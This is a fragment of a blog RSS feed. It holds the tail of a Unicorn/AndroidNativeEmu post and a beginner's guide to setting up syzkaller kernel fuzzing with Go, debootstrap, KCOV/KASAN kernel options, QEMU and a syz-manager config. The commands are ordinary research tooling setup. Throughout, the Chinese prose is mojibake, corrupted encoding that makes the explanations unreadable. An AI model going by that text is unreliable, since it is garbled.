&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">method&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">MainActivity&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">jvm_methods&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">values&lt;/span>&lt;span class="p">():&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">native&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">logger&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;- [0x&lt;/span>&lt;span class="si">%08x&lt;/span>&lt;span class="s2">] &lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2"> - &lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">native_addr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">signature&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">except&lt;/span> &lt;span class="n">UcError&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Exit at &lt;/span>&lt;span class="si">%x&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="n">emulator&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">mu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">reg_read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">UC_ARM_REG_PC&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">raise&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>samples æ–‡ä»¶å¤¹ä¸‹å‡ ä¸ªå…·ä½“çš„å®ä¾‹&lt;/li>
&lt;/ul>
&lt;h3 id="unicorefuzzhttpsgithubcomfgsectunicorefuzz">&lt;a class="link" href="https://github.com/fgsect/unicorefuzz" target="_blank" rel="noopener"
>unicorefuzz&lt;/a>&lt;/h3>
&lt;p>åˆå¹¶åˆ°AFLç³»åˆ—æ€»ç»“&lt;/p>
&lt;h3 id="å‚è€ƒ">å‚è€ƒ&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>ä¸­æ–‡æ–‡æ¡£https://github.com/kabeor/Micro-Unicorn-Engine-API-Documentation&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/unicorn-engine/unicorn" target="_blank" rel="noopener"
>https://github.com/unicorn-engine/unicorn&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/P4nda0s/AndroidNativeEmu" target="_blank" rel="noopener"
>https://github.com/P4nda0s/AndroidNativeEmu&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://app.yinxiang.com/fx/a6cc6633-a93f-4111-a06a-cccd5fa39e0f" target="_blank" rel="noopener"
>https://app.yinxiang.com/fx/a6cc6633-a93f-4111-a06a-cccd5fa39e0f&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/fgsect/unicorefuzz" target="_blank" rel="noopener"
>https://github.com/fgsect/unicorefuzz&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>syzkaller_fuzzing_å…¥é—¨</title><link>https://ykiko.top/p/syzkaller_fuzzing_%E5%85%A5%E9%97%A8/</link><pubDate>Fri, 10 Apr 2020 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/syzkaller_fuzzing_%E5%85%A5%E9%97%A8/</guid><description>&lt;h1 id="syzkaller_fuzzing_å…¥é—¨">syzkaller_fuzzing_å…¥é—¨&lt;/h1>
&lt;h3 id="0x00-ä»‹ç»">0x00 ä»‹ç»&lt;/h3>
&lt;p>&lt;a class="link" href="https://github.com/google/syzkaller" target="_blank" rel="noopener"
>syzkaller&lt;/a>æ˜¯googleçš„å®‰å…¨ç ”ç©¶äººå‘˜å¼€å‘å¹¶ç»´æŠ¤çš„å†…æ ¸fuzzå·¥å…·ã€‚å®ƒä¸»è¦æ˜¯ç”¨goå†™çš„ï¼Œä¹Ÿæœ‰å°‘éƒ¨åˆ†Cä»£ç ï¼Œæ”¯æŒakaros/fuchsia/linux/android/freebsd/netbsd/openbsd/windowsç­‰ç³»ç»Ÿï¼Œå‘ç°çš„æ¼æ´å¤šè¾¾ä¸Šåƒã€‚&lt;/p>
&lt;h3 id="0x01-ç¯å¢ƒé…ç½®">0x01 ç¯å¢ƒé…ç½®&lt;/h3>
&lt;p>&lt;strong>ç¯å¢ƒè¦æ±‚&lt;/strong>ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>C/C++ ç¼–è¯‘å™¨&lt;/p>
&lt;ul>
&lt;li>GCC 6.1.0+&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>linux kernel&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ç¼–è¯‘ v4.6ä»¥åç¼–è¯‘æ—¶ç¡®ä¿&lt;code>CONFIG_KCOV=y&lt;/code> ä¹‹å‰ç‰ˆæœ¬ï¼š&lt;a class="link" href="https://github.com/torvalds/linux/commit/5c9a8750a6409c63a0f01d51a9024861022f6593" target="_blank" rel="noopener"
>è¿™æ ·&lt;/a>æ·»åŠ æ”¯æŒ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸€äº›é¢å¤–&lt;a class="link" href="https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md" target="_blank" rel="noopener"
>é€‰é¡¹&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>VM ä¸€èˆ¬QEMU&lt;/p>
&lt;ul>
&lt;li>
&lt;p>æ”¯æŒQEMUã€kvmtoolå’ŒGCEè™šæ‹Ÿæœºã€Androidè®¾å¤‡å’ŒOdroid C2å¼€å‘æ¿&lt;/p>
&lt;/li>
&lt;li>
&lt;p>éœ€è¦è¿›è¡Œé€šä¿¡ï¼švmè¦æä¾›ç½‘ç»œæ”¯æŒ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>vmé…ç½®éœ€è¦sshæœåŠ¡å™¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è¦èƒ½æ‰§è¡Œ&lt;code>ssh -i $SSHID -p $PORT root@localhost&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>éœ€è¦å°†&lt;code>debugfs&lt;/code> æŒ‚åœ¨åˆ° &lt;code>/sys/kernel/debug&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://golang.org/" target="_blank" rel="noopener"
>Golang&lt;/a> å®‰è£…&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tar -C ~/goroot -xzf go1.14.1.linux-amd64.tar.gz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vim /etc/profile
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mkdir /usr/local/gopath
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ·»åŠ export &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">GOROOT&lt;/span>&lt;span class="o">=&lt;/span>/home/kuekiko/goroot
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">GOPATH&lt;/span>&lt;span class="o">=&lt;/span>/home/kuekiko/gopath
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">PATH&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$GOROOT&lt;/span>/bin:&lt;span class="nv">$PATH&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">PATH&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$GOPATH&lt;/span>/bin:&lt;span class="nv">$PATH&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">source&lt;/span> etc/profile
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>syzkaller&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># build&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">go get -u -d github.com/google/syzkaller/...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> &lt;span class="nv">$GOROOT&lt;/span>/src/github.com/google/syzkaller/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make -j4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># buildä¹‹ååœ¨bin/ä¸‹&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>å¦‚æœè¦cross-OS/arch è¿›è¡Œæµ‹è¯•çš„è¯ï¼Œè®°å¾—ä¿®æ”¹&lt;code>TARGETOS&lt;/code>, &lt;code>TARGETVMARCH&lt;/code> å’Œ&lt;code>TARGETARCH&lt;/code>å‚æ•°å†&lt;code>make&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-init-syzkaller">0x02 Init syzkaller&lt;/h3>
&lt;p>ç”Ÿæˆé•œåƒ&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo apt install debootstrap
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> gopath/src/github.com/google/syzkaller/tools/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ä½¿ç”¨å›½å†…æº ä¿®æ”¹create-image.sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo debootstrap --include&lt;span class="o">=&lt;/span>&lt;span class="nv">$PREINSTALL_PKGS&lt;/span> --components&lt;span class="o">=&lt;/span>main,contrib,non-free &lt;span class="nv">$RELEASE&lt;/span> &lt;span class="nv">$DIR&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ”¹æˆ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo debootstrap --include&lt;span class="o">=&lt;/span>&lt;span class="nv">$PREINSTALL_PKGS&lt;/span> --components&lt;span class="o">=&lt;/span>main,contrib,non-free &lt;span class="nv">$RELEASE&lt;/span> &lt;span class="nv">$DIR&lt;/span> http://mirrors.163.com/debian/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./create-image.sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># é€‰é¡¹ --distribution wheezy --feature full&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç”Ÿæˆäº†stretch.id_rsa stretch.id_rsa.pub stretch.img&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ç¼–è¯‘å¯åŠ¨-å†…æ ¸">ç¼–è¯‘å¯åŠ¨ å†…æ ¸&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">KERNEL&lt;/span>&lt;span class="o">=&lt;/span>/home/kuekiko/linux_kernel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">IMG&lt;/span>&lt;span class="o">=&lt;/span>/home/kuekiko/linux_kernel/img
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">PATH&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$KERNEL&lt;/span>:&lt;span class="nv">$PATH&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">PATH&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$IMG&lt;/span>:&lt;span class="nv">$PATH&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># é»˜è®¤ç¼–è¯‘&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> &lt;span class="nv">$KERNEL&lt;/span>/xxx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make &lt;span class="nv">CC&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$GCC&lt;/span>&lt;span class="s2">/bin/gcc&amp;#34;&lt;/span> defconfig
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make &lt;span class="nv">CC&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$GCC&lt;/span>&lt;span class="s2">/bin/gcc&amp;#34;&lt;/span> kvmconfig
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç›´æ¥ make menuconfig &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç¼–è¾‘.config&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CONFIG_KCOV&lt;/span>&lt;span class="o">=&lt;/span>y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CONFIG_DEBUG_INFO&lt;/span>&lt;span class="o">=&lt;/span>y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CONFIG_KASAN&lt;/span>&lt;span class="o">=&lt;/span>y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CONFIG_KASAN_INLINE&lt;/span>&lt;span class="o">=&lt;/span>y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ–°&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CONFIG_CONFIGFS_FS&lt;/span>&lt;span class="o">=&lt;/span>y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CONFIG_SECURITYFS&lt;/span>&lt;span class="o">=&lt;/span>y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make &lt;span class="nv">CC&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$GCC&lt;/span>&lt;span class="s2">/bin/gcc&amp;#34;&lt;/span> olddefconfig
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make &lt;span class="nv">CC&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$GCC&lt;/span>&lt;span class="s2">/bin/gcc&amp;#34;&lt;/span> -j4
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="qemu">qemu&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">qemu-system-x86_64 &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -kernel &lt;span class="nv">$KERNEL&lt;/span>/arch/x86/boot/bzImage &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -append &lt;span class="s2">&amp;#34;console=ttyS0 root=/dev/sda earlyprintk=serial&amp;#34;&lt;/span>&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -hda &lt;span class="nv">$IMAGE&lt;/span>/stretch.img &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -net user,hostfwd&lt;span class="o">=&lt;/span>tcp::10021-:22 -net nic &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -enable-kvm &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -nographic &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -m 2G &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -smp &lt;span class="m">2&lt;/span> &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -pidfile vm.pid &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="p">|&lt;/span> tee vm.log
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>sshè¿æ¥&lt;/p>
&lt;p>&lt;code>ssh -i $IMG/stretch.id_rsa -p 10021 -o &amp;quot;StrictHostKeyChecking no&amp;quot; root@localhost&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200417165654.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>kill qemu ä½¿ç”¨&lt;code>kill $(cat vm.pid)&lt;/code>&lt;/p>
&lt;h3 id="0x03-start-fuzzing">0x03 Start Fuzzing&lt;/h3>
&lt;p>æ·»åŠ é…ç½®æ–‡ä»¶my.cfg&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-json" data-lang="json">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;target&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;linux/amd64&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;http&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;127.0.0.1:56741&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;workdir&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$GOPATH/src/github.com/google/syzkaller/workdir&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;kernel_obj&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$KERNEL&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;image&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$IMAGE/stretch.img&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;sshkey&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$IMAGE/stretch.id_rsa&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;syzkaller&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$GOPATH/src/github.com/google/syzkaller&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;procs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;qemu&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;vm&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;count&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;kernel&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$KERNEL/arch/x86/boot/bzImage&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;cpu&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;mem&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2048&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¯åŠ¨fuzzing&lt;/p>
&lt;p>&lt;code>./bin/syz-manager -config=my.cfg&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200417185540.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æµè§ˆå™¨æ‰“å¼€http://127.0.0.1:56741/&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200417185612.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>è™šæ‹Ÿæœºæ€§èƒ½å¤ªåƒåœ¾ï¼Œå¤ªæ…¢äº† fuzzingåŠå¤©æ²¡ä¹Ÿå•¥crashesã€‚è¿˜æ˜¯å¾—ç”¨æœåŠ¡å™¨ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200417190242.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æŒ‚æœºäº†å¤§æ¦‚3å°æ—¶ï¼Œå‡ºäº†å‡ ä¸ªæ²¡å•¥ç”¨çš„crachã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200417205533.png"
loading="lazy"
alt="img"
>&lt;/p>
